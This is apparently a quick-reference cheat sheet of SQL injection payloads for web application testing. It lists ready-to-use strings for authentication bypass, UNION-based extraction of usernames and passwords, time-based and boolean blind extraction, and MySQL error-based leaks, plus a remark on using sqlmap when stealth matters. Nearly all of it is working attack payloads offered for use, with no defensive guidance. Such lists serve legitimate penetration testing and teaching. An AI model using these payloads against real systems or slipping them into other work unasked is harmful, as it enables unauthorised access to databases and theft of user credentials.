## Quick-Use

**Common Payloads**:

*note*: the comment marker used below is ` -- ` which may need to be changed out for `#` if that's the SQL comment syntax
- Boolean Auth bypass - `admin' AND '1=1' -- ` - submits a SQL query that always returns TRUE and grants admin access if not sanitized or handled properly
- Simple UNION data grab (basic union extract) - `' UNION ALL SELECT NULL, username, password FROM users -- ` - If the injectable parameter is used in a SELECT and the number/types of columns match, `UNION` can return rows from other tables (adjust columns / NULLs to match the query).
- Time-based blind (confirm injection when output is not visible) - `' OR IF(1=1, SLEEP(5), 0) -- ` - No visible error/output? Use time delays to infer true/false. Replace `1=1` with a condition that extracts data bit-by-bit during real testing.
- Error-based leak (MySQL `extractvalue` trick) - `' AND extractvalue(1, concat(0x3a, (SELECT database()), 0x3a)) -- ` - Triggers database error messages that sometimes include attacker-controlled text — useful when the app echoes DB errors.
- Blind boolean (bit-by-bit extraction scaffold) - `' AND (SELECT (ASCII(SUBSTRING((SELECT column FROM table LIMIT 0,1),1,1)) & 1)) = 1 -- ` - Use to enumerate data one bit/char at a time when only boolean responses are available. Combine with binary search logic to speed extraction.

*Tools*:
- `sqlmap` - CLI tool to automate sql injections. It's very taxing on the service so avoid use where the system might get DOSd or stealth is a priority. `*` is the injection marker, but SQL map can also autodetect injection points
